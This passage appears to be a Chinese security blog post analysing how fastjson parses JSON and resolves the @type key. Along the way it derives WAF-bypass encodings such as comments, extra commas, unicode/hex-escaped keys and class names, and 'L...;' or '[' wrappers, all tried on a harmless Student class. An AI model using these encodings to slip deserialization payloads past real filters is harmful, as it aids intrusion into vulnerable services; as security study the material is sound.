<p><strong>@type</strong><br>如果每次都需要传递具体是哪个类的，就会显得这个反序列化很笨重，所以开发者给定了一个@type的键，可以在json字符串里面指定具体要反序列化为哪个对象<br><code>serJson = &quot;&#123;\&quot;@type\&quot;:\&quot;Student\&quot;,\&quot;age\&quot;:12,\&quot;name\&quot;:\&quot;Sam\&quot;&#125;&quot;;</code><br>如果是将这样的json字符串进行反序列化，那么上面的三种反序列化方式也都可以正确反序列化<br>所以这个点也是后续漏洞的核心关键</p>
</blockquote>
<h2 id="反序列化源码分析"><a href="#反序列化源码分析" class="headerlink" title="反序列化源码分析"></a>反序列化源码分析</h2><p><img src="/2022/12/01/fastjson%E5%88%9D%E5%AD%A6/3.jpg" alt></p>
<h3 id="No1-DefaultJSONParser"><a href="#No1-DefaultJSONParser" class="headerlink" title="No1 DefaultJSONParser"></a>No1 DefaultJSONParser</h3><p>首先会进入这里，new了一个DefaultJSONParser对象<br><img src="/2022/12/01/fastjson%E5%88%9D%E5%AD%A6/4.jpg" alt><br>跟进去会首先判断第一个字符是什么，如果是“{”，就会将token设置为12，如果是“[”，就会设置14，如果都不是就会进入nextToken，主要作用就是看下一个字符是什么，如果碰到了“{”就将token设置为12<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//部分代码</span></span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;[&#x27;</span>:</span><br><span class="line">    <span class="built_in">this</span>.next();</span><br><span class="line">    <span class="built_in">this</span>.token = <span class="number">14</span>;</span><br><span class="line">    <span class="keyword">return</span>;</span><br></pre></td></tr></table></figure><br>当然还有其它情况，比如碰到空格之类的，就会继续跳到下一个字符，直到碰到像“{”这样的字符，有时绕waf可能就会用到这些特性，比如在json前面填充垃圾字符<br><code>serJson = &quot;        &#123;\&quot;@type\&quot;:\&quot;Student\&quot;,\&quot;age\&quot;:12,\&quot;name\&quot;:\&quot;Sam\&quot;&#125;&quot;;</code><br>剩下的读者可以自行分析</p>
<blockquote>
<p><strong>小插曲</strong><br>这里我将{}改成了[]，然后进行了反序列化<br><code>serJson = &quot;[\&quot;@type\&quot;:\&quot;Student\&quot;,\&quot;age\&quot;:12,\&quot;name\&quot;:\&quot;Sam\&quot;]&quot;;</code><br><img src="/2022/12/01/fastjson%E5%88%9D%E5%AD%A6/5.jpg" alt><br>但是报错了，继续fuzz，试了一下{开头，]结尾<br><img src="/2022/12/01/fastjson%E5%88%9D%E5%AD%A6/6.jpg" alt><br>虽然最后报错了，但是前面确实可以反序列化，说不定这种就可以绕一下waf</p>
</blockquote>
<p><em>注意上面的操作都是在json字符串之前的，也就是在“{”前面的一些检查，接下来就进入{}里面了</em></p>
<h3 id="No2-parseObject-gt-skipWhitespace"><a href="#No2-parseObject-gt-skipWhitespace" class="headerlink" title="No2 parseObject()-&gt;skipWhitespace()"></a>No2 parseObject()-&gt;skipWhitespace()</h3><p>走完DefaultJSONParser的初始化，就进入到parser.parse()<br><img src="/2022/12/01/fastjson%E5%88%9D%E5%AD%A6/7.jpg" alt><br>因为之前是{，所以设置的token为12，所以就会进入这个case<br>由于字节的原因，我不能在这下断点，所以我直接将断点打到parseObject里面<br><img src="/2022/12/01/fastjson%E5%88%9D%E5%AD%A6/8.jpg" alt><br>直接跳到这个循环处<br><img src="/2022/12/01/fastjson%E5%88%9D%E5%AD%A6/9.jpg" alt><br>第一个函数根据英文意思skipWhitespace，可以大概猜出是跳过空白字符串<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">skipWhitespace</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">while</span>(<span class="literal">true</span>) &#123;</span><br><span class="line">        <span class="keyword">while</span>(<span class="literal">true</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">this</span>.ch &lt;= <span class="string">&#x27;/&#x27;</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="built_in">this</span>.ch == <span class="string">&#x27; &#x27;</span> || <span class="built_in">this</span>.ch == <span class="string">&#x27;\r&#x27;</span> || <span class="built_in">this</span>.ch == <span class="string">&#x27;\n&#x27;</span> || <span class="built_in">this</span>.ch == <span class="string">&#x27;\t&#x27;</span> || <span class="built_in">this</span>.ch == <span class="string">&#x27;\f&#x27;</span> || <span class="built_in">this</span>.ch == <span class="string">&#x27;\b&#x27;</span>) &#123;</span><br><span class="line">                    <span class="built_in">this</span>.next();</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (<span class="built_in">this</span>.ch == <span class="string">&#x27;/&#x27;</span>) &#123;</span><br><span class="line">                    <span class="built_in">this</span>.skipComment();</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>可以看到具体实现，不仅可以跳过空格，换行之类的，还可以跳过注释（skipComment）<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">skipComment</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.next();</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.ch != <span class="string">&#x27;/&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>.ch == <span class="string">&#x27;*&#x27;</span>) &#123;</span><br><span class="line">            <span class="built_in">this</span>.next();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">while</span>(<span class="built_in">this</span>.ch != <span class="number">26</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="built_in">this</span>.ch == <span class="string">&#x27;*&#x27;</span>) &#123;</span><br><span class="line">                    <span class="built_in">this</span>.next();</span><br><span class="line">                    <span class="keyword">if</span> (<span class="built_in">this</span>.ch == <span class="string">&#x27;/&#x27;</span>) &#123;</span><br><span class="line">                        <span class="built_in">this</span>.next();</span><br><span class="line">                        <span class="keyword">return</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="built_in">this</span>.next();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;invalid comment&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.next();</span><br><span class="line">        &#125; <span class="keyword">while</span>(<span class="built_in">this</span>.ch != <span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">this</span>.next();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>那么就是/*xxxx*/<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;Student&quot;</span>&#125;</span><br><span class="line">&#123; <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;Student&quot;</span>&#125;</span><br><span class="line">&#123;<span class="comment">/**/&quot;<span class="doctag">@type</span>&quot;:&quot;Student&quot;&#125;</span></span><br><span class="line"><span class="comment">&#123;/*abcdef*/</span><span class="string">&quot;@type&quot;</span>:<span class="string">&quot;Student&quot;</span>&#125;</span><br></pre></td></tr></table></figure><br>那么这四种其实效果相同，都可以达到反序列化的目的</p>
<h3 id="No3-parseObject-gt-AllowArbitraryCommas"><a href="#No3-parseObject-gt-AllowArbitraryCommas" class="headerlink" title="No3 parseObject()-&gt;AllowArbitraryCommas"></a>No3 parseObject()-&gt;AllowArbitraryCommas</h3><p>在走完上面的判断以后，接下来就是<br><img src="/2022/12/01/fastjson%E5%88%9D%E5%AD%A6/10.jpg" alt><br>同样，根据字面意思和代码，大概推断就是判断有没有逗号，如果有就跳过<br>也就是<code>&#123;,,,,&quot;@type&quot;:&quot;Student&quot;&#125;</code>，也是可以进行正常反序列化的</p>
<h3 id="No4-parseObject-gt-scanSymbol"><a href="#No4-parseObject-gt-scanSymbol" class="headerlink" title="No4 parseObject()-&gt;scanSymbol()"></a>No4 parseObject()-&gt;scanSymbol()</h3><p>继续往下走<br><img src="/2022/12/01/fastjson%E5%88%9D%E5%AD%A6/11.jpg" alt><br>因为走完前面的一系列操作，那么当前的字符就是@type之前的双引号了<br>这里的scanSymbol很重要，主要就是扫描到下一个双引号出现之前的字符串，在这就是@type<br>其中有几段比较重要的特性，我这截取了部分代码<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (chLocal == <span class="string">&#x27;\\&#x27;</span>) &#123;</span><br><span class="line">    chLocal = <span class="built_in">this</span>.next();</span><br><span class="line">    <span class="keyword">switch</span>(chLocal) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;u&#x27;</span>:</span><br><span class="line">            <span class="type">char</span> <span class="variable">c1</span> <span class="operator">=</span> <span class="built_in">this</span>.next();</span><br><span class="line">            <span class="type">char</span> <span class="variable">c2</span> <span class="operator">=</span> <span class="built_in">this</span>.next();</span><br><span class="line">            <span class="type">char</span> <span class="variable">c3</span> <span class="operator">=</span> <span class="built_in">this</span>.next();</span><br><span class="line">            <span class="type">char</span> <span class="variable">c4</span> <span class="operator">=</span> <span class="built_in">this</span>.next();</span><br><span class="line">            <span class="type">int</span> <span class="variable">val</span> <span class="operator">=</span> Integer.parseInt(<span class="keyword">new</span> <span class="title class_">String</span>(<span class="keyword">new</span> <span class="title class_">char</span>[]&#123;c1, c2, c3, c4&#125;), <span class="number">16</span>);</span><br><span class="line">            hash = <span class="number">31</span> * hash + val;</span><br><span class="line">            <span class="built_in">this</span>.putChar((<span class="type">char</span>)val);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;x&#x27;</span>:</span><br><span class="line">            <span class="type">char</span> <span class="variable">x1</span> <span class="operator">=</span> <span class="built_in">this</span>.ch = <span class="built_in">this</span>.next();</span><br><span class="line">            <span class="type">char</span> <span class="variable">x2</span> <span class="operator">=</span> <span class="built_in">this</span>.ch = <span class="built_in">this</span>.next();</span><br><span class="line">            <span class="type">int</span> <span class="variable">x_val</span> <span class="operator">=</span> digits[x1] * <span class="number">16</span> + digits[x2];</span><br><span class="line">            <span class="type">char</span> <span class="variable">x_char</span> <span class="operator">=</span> (<span class="type">char</span>)x_val;</span><br><span class="line">            hash = <span class="number">31</span> * hash + x_char;</span><br><span class="line">            <span class="built_in">this</span>.putChar(x_char);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>什么意思呢，就是当遇见斜杠，那么就看斜杠后面第一个字母是什么<br>如果是u那就读取u后面4位，当作unicode解码<br>同理如果是x就当作十六进制解码<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;Student&quot;</span>&#125;</span><br><span class="line">&#123;<span class="string">&quot;\u0040\u0074\u0079\u0070\u0065&quot;</span>:<span class="string">&quot;Student&quot;</span>&#125;</span><br><span class="line">&#123;<span class="string">&quot;\u0040\u0074\u0079pe&quot;</span>:<span class="string">&quot;Student&quot;</span>&#125;</span><br><span class="line">&#123;<span class="string">&quot;\x40\x74\x79\x70\x65&quot;</span>:<span class="string">&quot;Student&quot;</span>&#125;</span><br><span class="line">&#123;<span class="string">&quot;\x40\x74\x79pe&quot;</span>:<span class="string">&quot;Student&quot;</span>&#125;</span><br></pre></td></tr></table></figure><br>这上面5个json是等价的，都可以正常进行反序列化</p>
<h3 id="No5-parseObject-gt-TypeUtils-loadClass"><a href="#No5-parseObject-gt-TypeUtils-loadClass" class="headerlink" title="No5 parseObject()-&gt;TypeUtils.loadClass()"></a>No5 parseObject()-&gt;TypeUtils.loadClass()</h3><p>提取完了@type这个键的字符串以后，就要解析键值了，在这里就是Student<br><img src="/2022/12/01/fastjson%E5%88%9D%E5%AD%A6/12.jpg" alt><br>可以看到同样用到了scanSymbol，也就是说我们的类名也可以用十六进制和unicode去编码<br><code>&#123;&quot;\x40\x74\x79pe&quot;:&quot;\u0053\u0074\u0075dent&quot;&#125;</code><br>接着就进入到了loadClass了，动态加载类<br><img src="/2022/12/01/fastjson%E5%88%9D%E5%AD%A6/13.jpg" alt><br>首先会在mappings中去找是否存在这些类，如果不存在就跳到<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (classLoader != <span class="literal">null</span>) &#123;</span><br><span class="line">    clazz = classLoader.loadClass(className);</span><br><span class="line">    mappings.put(className, clazz);</span><br><span class="line">    <span class="keyword">return</span> clazz;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>去动态加载类，并且将类和类名添加到mappings中，然后返回此类，这里的mappings其实是一个缓存，一般是java的原生类，关于动态加载类到底知识可以自己百度搜索一下，这里不细说</p>
<blockquote>
<p>小插曲<br>这里我注意到了中间两个if语句<br>第一个：如果第一个字符是“[”，那么就将他去掉，在进行loadClass<br>第二个：如果第一个字符是“L”,且结尾是“;”，那么也是去掉以后调用loadClass<br>这里我fuzz了一下<br><code>&#123;&quot;@type&quot;:&quot;[Student&quot;&#125;</code><br>中括号加在最前面会报错，不知道为什么，但是根据他的报错信息，我最后整理了一个新的可以利用的，在下一篇我会说一下我是如何找出这样的payload的<code>&#123;&quot;@type&quot;:&quot;[Student&quot;[&#123;,&quot;age&quot;:12,&quot;name&quot;:&quot;kaikaix&quot;&#125;</code><br><code>&#123;&quot;@type&quot;:&quot;LStudent;&quot;&#125;</code><br><code>&#123;&quot;@type&quot;:&quot;LLStudent;;&quot;&#125;</code><br>这样就不会报错，可以继续接下来的操作，调用无参构造和set方法</p>
</blockquote>
<h3 id="No6-parseObject-gt-getDeserializer"><a href="#No6-parseObject-gt-getDeserializer" class="headerlink" title="No6 parseObject()-&gt;getDeserializer()"></a>No6 parseObject()-&gt;getDeserializer()</h3><p>接下来到了<br><img src="/2022/12/01/fastjson%E5%88%9D%E5%AD%A6/14.jpg" alt><br>我们进入到getDeserializer中，到了一个denyList的一个循环<br><img src="/2022/12/01/fastjson%E5%88%9D%E5%AD%A6/15.jpg" alt><br>这里前面的replace是将“$”替换为“.”</p>
<blockquote>
<p>如果A类中有个内部类B<br>在编译的时候会生成A.class和A$B.class</p>
</blockquote>
<p>那么这一段代码就是用来检查你的类名是否在黑名单中，但是在这个版本的fastjson，黑名单只有两个Thread类</p>
<h3 id="No7-parseObject-gt-getDeserializer-gt-createJavaBeanDeserializer"><a href="#No7-parseObject-gt-getDeserializer-gt-createJavaBeanDeserializer" class="headerlink" title="No7 parseObject()-&gt;getDeserializer()-&gt;createJavaBeanDeserializer()"></a>No7 parseObject()-&gt;getDeserializer()-&gt;createJavaBeanDeserializer()</h3><p>过了黑名单以后，就会与一些fastjson支持的类进行匹配，如果匹配到了就会返回相应的Deserializer<br>如果匹配不到就到下图代码中的地方<br><img src="/2022/12/01/fastjson%E5%88%9D%E5%AD%A6/16.jpg" alt><br>进入到这个函数中会先获取一下clazz的父类，然后就到了这里<br><img src="/2022/12/01/fastjson%E5%88%9D%E5%AD%A6/17.jpg" alt><br>主要就是通过获取构造函数和一些成员方法构建了一个JavaBeanInfo类，并返回<br>感兴趣的可以自己调试看看内部到底做了些什么事情<br>之后就是调用set方法了，不知道为什么调试不了，就不分析了</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>在写这篇文章之前也不知道一些绕过方法，只是分析了一下fastjson的原理，后面看到网上的那些方法，没想到我竟然凑巧把这些绕过payload自己搞出来了，还是有点小高兴。所以说知道原理还是很重要的。<br>在下一篇就研究一下fastjson的反序列化利用，和一些绕过payload</p>
]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>代码审计</tag>
        <tag>java</tag>
      </tags>
  </entry>
</search>
